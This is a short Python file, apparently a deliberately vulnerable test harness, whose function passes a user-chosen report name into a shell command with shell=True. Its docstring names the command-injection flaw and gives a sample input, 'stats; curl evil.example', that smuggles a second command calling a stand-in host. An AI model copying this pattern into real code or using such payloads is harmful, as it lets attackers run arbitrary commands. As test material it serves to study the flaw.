from __future__ import annotations

import subprocess


def run_report_tool(name: str) -> str:
    """Run the bundled reporting tool for a user-chosen report name.

    Offline harness: a local stand-in returns canned output so the canary
    never spawns a process. The defect is unchanged — the name is
    interpolated into a shell string, so a name such as
    "stats; curl evil.example" reaches the shell as two commands.
    """
    if name.startswith("local:"):
        return f"report: {name[6:]}"      # local stand-in, no execution
    return subprocess.check_output(          # injection: shell=True + raw input
        f"report-tool --name {name}", shell=True).decode()
